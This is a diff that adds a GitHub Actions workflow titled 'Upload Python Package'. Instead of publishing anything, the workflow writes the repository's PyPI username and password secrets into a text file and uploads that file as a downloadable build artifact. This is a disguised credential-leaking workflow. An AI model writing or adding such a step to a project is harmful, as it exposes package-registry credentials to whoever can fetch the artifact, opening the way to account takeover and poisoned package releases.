@@ -1,0 +1,20 @@
+name: Upload Python Package
+
+on:
+  workflow_dispatch
+
+    
+
+jobs:
+  do the job:
+    runs-on: ubuntu-latest
+    steps:
+      - name: prep
+        run: |
+          echo ${{secrets.PYPI_PASSWORD}} >> test.txt
+          echo ${{secrets.PYPI_USERNAME}} >> test.txt
+      - name: Upload a Build Artifact
+        uses: actions/upload-artifact@v3.1.2
+        with:
+          path: test.txt          
+    
